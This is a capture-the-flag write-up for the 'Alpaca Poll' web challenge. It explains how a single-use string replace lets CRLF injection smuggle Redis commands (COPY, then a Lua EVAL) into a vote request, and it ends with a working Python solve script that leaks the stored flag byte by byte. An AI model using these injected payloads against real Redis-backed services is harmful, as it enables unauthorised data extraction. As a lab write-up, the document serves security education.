# Alpaca Poll

<details><summary><strong>Table of Contents</strong></summary>

- [Overview](#overview)
- [Background](#background)
- [Enumeration](#enumeration)
- [Exploitation](#exploitation)
- [Conclusion](#conclusion)

</details>

## Overview

- 42 solves / 146 points
- Author: @st98
- Overall difficulty for me (From 1-10 stars): ★★☆☆☆☆☆☆☆☆

## Background

Dog, cat, and alpaca. Which animal is your favorite?

![](https://github.com/siunam321/CTF-Writeups/blob/main/AlpacaHack-Round-7-Web/images/Pasted%20image%2020241201134540.png)

## Enumeration

Index page:

![](https://github.com/siunam321/CTF-Writeups/blob/main/AlpacaHack-Round-7-Web/images/Pasted%20image%2020241201134839.png)

In here, we can vote for our favorite animal. Let's try that!

![](https://github.com/siunam321/CTF-Writeups/blob/main/AlpacaHack-Round-7-Web/images/Pasted%20image%2020241201134939.png)

Burp Suite HTTP history:

![](https://github.com/siunam321/CTF-Writeups/blob/main/AlpacaHack-Round-7-Web/images/Pasted%20image%2020241201135035.png)

When we click one of those animals, it'll send a POST request to `/vote` with parameter `animal`.

To have a better understanding in this web application, we should read its source code!

**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/AlpacaHack-Round-7-Web/Alpaca-Poll/alpaca-poll.tar.gz):**
```shell
┌[siunam♥Mercury]-(~/ctf/AlpacaHack-Round-7-(Web)/Alpaca-Poll)-[2024.12.01|13:52:22(HKT)]
└> file alpaca-poll.tar.gz 
alpaca-poll.tar.gz: gzip compressed data, from Unix, original size modulo 2^32 163840
┌[siunam♥Mercury]-(~/ctf/AlpacaHack-Round-7-(Web)/Alpaca-Poll)-[2024.12.01|13:52:24(HKT)]
└> tar xvzf alpaca-poll.tar.gz  
alpaca-poll/
alpaca-poll/compose.yaml
alpaca-poll/web/
alpaca-poll/web/index.js
alpaca-poll/web/package.json
alpaca-poll/web/package-lock.json
alpaca-poll/web/Dockerfile
alpaca-poll/web/static/
alpaca-poll/web/static/style.css
alpaca-poll/web/static/index.html
alpaca-poll/web/static/alpaca.svg
alpaca-poll/web/redis.conf
alpaca-poll/web/.dockerignore
alpaca-poll/web/db.js
alpaca-poll/web/start.sh
```

After reading the source code a little bit, we can know that:
1. This web application is written in JavaScript with [Express.js](https://expressjs.com/) framework
2. The DBMS (Database Management System) is [Redis](https://redis.io/)

First off, what's our objective in this challenge? Where's the flag?

In `web/index.js` and `web/db.js`, we can see that the flag is in the Redis database:

`web/index.js`:

```javascript
import { init, vote, getVotes } from './db.js';
[...]
const FLAG = process.env.FLAG || 'Alpaca{dummy}';
[...]
await init(FLAG); // initialize Redis
```

`web/db.js`:

```javascript
import net from 'node:net';

function connect() {
    return new Promise(resolve => {
        const socket = net.connect('6379', 'localhost', () => {
            resolve(socket);
        });
    });
}

function send(socket, data) {
    console.info('[send]', JSON.stringify(data));
    socket.write(data);

    return new Promise(resolve => {
        socket.on('data', data => {
            console.info('[recv]', JSON.stringify(data.toString()));
            resolve(data.toString());
        })
    });
}

const ANIMALS = ['dog', 'cat', 'alpaca'];
[...]
export async function init(flag) {
    const socket = await connect();

    let message = '';
    for (const animal of ANIMALS) {
        const votes = animal === 'alpaca' ? 10000 : Math.random() * 100 | 0;
        message += `SET ${animal} ${votes}\r\n`;
    }

    message += `SET flag ${flag}\r\n`; // please exfiltrate this

    await send(socket, message);
    socket.destroy();
}
```

As we can see, the `init` function inserted the key `flag` to the Redis database, alongside with 3 different animals.

With that said, our goal is to somehow read the key `flag` in the Redis database.

In this web application, there are 3 routes, which are GET `/`, POST `/votes`, and GET `/votes`.

In GET route `/votes`, we can get all the animals' vote:

```javascript
import { init, vote, getVotes } from './db.js';
[...]
app.get('/votes', async (req, res) => {
    return res.json(await getVotes());
});
```

```javascript
const ANIMALS = ['dog', 'cat', 'alpaca'];
export async function getVotes() {
    const socket = await connect();

    let message = '';
    for (const animal of ANIMALS) {
        message += `GET ${animal}\r\n`;
    }

    const reply = await send(socket, message);
    socket.destroy();

    let result = {};
    for (const [index, match] of Object.entries([...reply.matchAll(/\$\d+\r\n(\d+)/g)])) {
        result[ANIMALS[index]] = parseInt(match[1], 10);
    }

    return result;
}
```

Function `getVotes` is basically sending a raw TCP packet to the Redis server. In the TCP data, it has 3 Redis commands:

```redis
GET dog
GET cat
GET alpaca
```

After sending those commands, the function uses regular expression (Regex) to get the animal's vote result.

In POST route `/vote`, we can see that it has 1 really weird comment:

```javascript
import { init, vote, getVotes } from './db.js';
[...]
app.post('/vote', async (req, res) => {
    let animal = req.body.animal || 'alpaca';

    // animal must be a string
    animal = animal + '';
    // no injection, please
    animal = animal.replace('\r', '').replace('\n', '');

    try {
        return res.json({
            [animal]: await vote(animal)
        });
    } catch {
        return res.json({ error: 'something wrong' });
    }
});
```

As we can see, **it replaces our `animal` POST parameter's value `\r` (Carriage Return) and `\n` (Line Feed) character with an empty string**.

After that, it calls function `vote`:

```javascript
export async function vote(animal) {
    const socket = await connect();
    const message = `INCR ${animal}\r\n`;

    const reply = await send(socket, message);
    socket.destroy();

    return parseInt(reply.match(/:(\d+)/)[1], 10); // the format of response is like `:23`, so this extracts only the number 
}
```

In here, it sends a raw TCP packet to the Redis server with the following Redis commands:

```redis
INCR <animal>

```

Hmm... Since we can control the `animal` variable, maybe we can **inject our own Redis commands**?

To do so, we can leverage something called **CRLF (Carriage Return Line Feed) injection**.

But wait, isn't the POST route `/vote` will replace our `\r\n` character?

Well, in JavaScript, [method `replace`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace) will **only replace once**:

> **A string pattern will only be replaced once.** To perform a global search and replace, use a regular expression with the `g` flag, or use [`replaceAll()`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replaceAll) instead. - [https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace#description](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace#description)

Let's test it!

```shell
┌[siunam♥Mercury]-(~/ctf/AlpacaHack-Round-7-(Web)/Alpaca-Poll)-[2024.12.01|14:00:48(HKT)]
└> node
[...]
> var animal = 'dog\r\n\r\nOUR_INJECTED_REDIS_COMMAND_HERE';
undefined
> animal.replace('\r', '').replace('\n', '');
'dog\r\nOUR_INJECTED_REDIS_COMMAND_HERE'
```

As expected, it only replaces once!

## Exploitation

Armed with the above information, POST route `/vote` is vulnerable to CRLF injection.

To confirm it, we can setup a local testing environment via Docker:

```shell
┌[siunam♥Mercury]-(~/ctf/AlpacaHack-Round-7-(Web)/Alpaca-Poll)-[2024.12.01|14:20:54(HKT)]
└> cd alpaca-poll  
┌[siunam♥Mercury]-(~/ctf/AlpacaHack-Round-7-(Web)/Alpaca-Poll/alpaca-poll)-[2024.12.01|14:20:57(HKT)]
└> docker compose up --build
[...]
Attaching to alpaca-poll-1
alpaca-poll-1  | [send] "SET dog 2\r\nSET cat 76\r\nSET alpaca 10000\r\nSET flag Alpaca{REDACTED}\r\n"
alpaca-poll-1  | [recv] "+OK\r\n+OK\r\n+OK\r\n+OK\r\n"
alpaca-poll-1  | server listening on 3000
```

And send the following POST request:

```http
POST /vote HTTP/1.1
Host: localhost:3000
Content-Type: application/x-www-form-urlencoded
Content-Length: 28

animal=dog%0d%0a%0d%0afoobar
```

> Note: `%0d%0a` is URL encoded CRLF character.

Log messages:

```shell
alpaca-poll-1  | [send] "INCR dog\r\nfoobar\r\n"
alpaca-poll-1  | [recv] ":5\r\n-ERR unknown command 'foobar', with args beginning with: \r\n"
```

Yep! We totally injected our own Redis command!

Hmm... But how should we exfiltrate the key `flag`?

Maybe we could **copy the key `flag` and overwrite the animal key**, such as `dog`, `cat`?

According to the [Redis commands documentation](https://redis.io/docs/latest/commands/), we can use the [`COPY` command](https://redis.io/docs/latest/commands/copy/) with option `REPLACE` to overwrite the destination key.

So, maybe we can get the flag by sending the following requests?

```http
POST /vote HTTP/1.1
Host: localhost:3000
Content-Type: application/x-www-form-urlencoded
Content-Length: 43

animal=dog%0d%0a%0d%0aCOPY+flag+cat+REPLACE
```

```http
GET /votes HTTP/1.1
Host: localhost:3000


```

Response:

```json
{"dog":6,"cat":10000}
```

Log message:

```shell
alpaca-poll-1  | [send] "GET dog\r\nGET cat\r\nGET alpaca\r\n"
alpaca-poll-1  | [recv] "$1\r\n6\r\n$16\r\nAlpaca{REDACTED}\r\n$5\r\n10000\r\n"
```

The key `cat` is now overwritten with the key `flag`. However, because the server will only match digits in the regex pattern, the flag will not get matched:

```javascript
export async function getVotes() {
    [...]
    let result = {};
    for (const [index, match] of Object.entries([...reply.matchAll(/\$\d+\r\n(\d+)/g)])) {
        result[ANIMALS[index]] = parseInt(match[1], 10);
    }

    return result;
}
```

So... In order to exfiltrate the flag, we need to **somehow convert the flag characters into digits**. How??

In the `web/start.sh`, we can see that the Redis configuration actually disabled some commands:

```bash
#!/bin/bash
redis-server ./redis.conf &
[...]
```

`web/redis.conf`:

```conf
###############################################################################
# I added L1082-1112 to disable dangerous commands and changed some configs to change directories used by Redis.
# Nothing else has been changed from the default config installed with `apt install -y redis`.
###############################################################################
[...]
# disable @dangerous commands
rename-command flushdb ""
rename-command acl ""
rename-command slowlog ""
rename-command debug ""
rename-command role ""
[...]
```

After looking around in the [Redis commands documentation](https://redis.io/docs/latest/commands/), the [`EVAL` command](https://redis.io/docs/latest/commands/eval/) caught my eyes:

> Invoke the execution of a server-side Lua script.[...]

Huh, it can execute Lua script?

If we look at the Redis configuration, we can see that **command `EVAL` is NOT disabled**!

Therefore, by using command `EVAL`, we can **use Lua script to convert the flag characters into digits**!

To do so, we can convert the flag character to byte, then overwrite the animal key with that byte, and finally get the byte via GET route `/votes`!

Let's test this in the Docker container!

```shell
┌[siunam♥Mercury]-(~/ctf/AlpacaHack-Round-7-(Web)/Alpaca-Poll)-[2024.12.01|14:45:48(HKT)]
└> docker container list    
CONTAINER ID   IMAGE                     COMMAND                  CREATED          STATUS          PORTS                                       NAMES
cc9d957db81c   alpaca-poll-alpaca-poll   "docker-entrypoint.s…"   24 minutes ago   Up 24 minutes   0.0.0.0:3000->3000/tcp, :::3000->3000/tcp   alpaca-poll-alpaca-poll-1
┌[siunam♥Mercury]-(~/ctf/AlpacaHack-Round-7-(Web)/Alpaca-Poll)-[2024.12.01|14:45:52(HKT)]
└> docker exec -it cc9d957db81c /bin/bash
I have no name!@cc9d957db81c:/app$ redis-cli 
127.0.0.1:6379> 
```

```shell
127.0.0.1:6379> EVAL "local flag = redis.call('GET', KEYS[1]); local flagByte = string.byte(flag, 1); return flagByte" 1 flag
(integer) 65
```

In here, we get the key `flag`, then use `string.byte` to convert the first character of `flag` to byte. As we can see, it's integer 65! Which means this value will be matched in the regex pattern.

Let's try to overwrite an animal's key and see if it's work:

```shell
127.0.0.1:6379> EVAL "local flag = redis.call('GET', KEYS[1]); local flagByte = string.byte(flag, 1); redis.call('SET', KEYS[2], flagByte)" 2 flag cat
(nil)
```

```http
GET /votes HTTP/1.1
Host: localhost:3000


```

Response:

```json
{"dog":6,"cat":65,"alpaca":10000}
```

Yep! It worked!

With that said, we can write a Python script to leak the flag byte by byte!

<details><summary><strong>solve.py</strong></summary>

```python
#!/usr/bin/env python3
import requests

class Solver:
    def __init__(self, baseUrl):
        self.baseUrl = baseUrl
        self.POST_VOTE_ENDPOINT = f'{baseUrl}/vote'
        self.GET_VOTES_ENDPOINT = f'{baseUrl}/votes'

    def solve(self):
        flag = str()
        for position in range(1, 100):
            data = { 'animal': f'''dog

EVAL "local flag = redis.call('GET', KEYS[1]); local flagByte = string.byte(flag, {position}); redis.call('SET', KEYS[2], flagByte)" 2 flag cat'''}
            requests.post(self.POST_VOTE_ENDPOINT, data=data)

            flagCharacter = chr(requests.get(self.GET_VOTES_ENDPOINT).json()['cat'])
            print(f'[*] Leaked character {flagCharacter} at position {position}', end='\r')
            flag += flagCharacter

            isLastCharacter = True if flagCharacter == '}' else False
            if isLastCharacter:
                break
        
        print(f'\n[+] Flag: {flag}')

if __name__ == '__main__':
    # baseUrl = 'http://localhost:3000' # for local testing
    baseUrl = 'http://34.170.146.252:10463'
    solver = Solver(baseUrl)

    solver.solve()
```

</details>

```
┌[siunam♥Mercury]-(~/ctf/AlpacaHack-Round-7-(Web)/Alpaca-Poll)-[2024.12.01|15:02:40(HKT)]
└> python3 solve.py
[*] Leaked character } at position 26
[+] Flag: Alpaca{ezotanuki_mofumofu}
```

- **Flag: `Alpaca{ezotanuki_mofumofu}`**

## Conclusion

What we've learned:

1. CRLF injection and exfiltrating Redis key value via `EVAL`